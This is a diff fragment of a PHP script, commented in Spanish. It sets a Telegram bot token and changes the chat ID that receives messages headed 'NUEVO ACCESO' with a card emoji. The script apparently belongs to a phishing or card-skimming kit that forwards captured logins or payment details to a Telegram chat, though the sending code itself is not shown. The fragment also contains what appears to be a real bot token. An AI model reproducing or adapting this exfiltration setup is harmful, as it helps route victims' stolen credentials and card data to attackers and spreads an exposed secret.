@@ -38,7 +38,7 @@ $fecha = date("Y-m-d H:i:s");
 
 // 🔐 TOKEN Y CHAT ID (TU BOT)
 $token = "8841860301:AAHhQSV7_J9op9KFyDZWG_g6D7xz_nGniew";
-$chat_id = "8841860301";
+$chat_id = "5744712441";
 
 // 🧾 MENSAJE
 $mensaje = "💳 NUEVO ACCESO\n\n";
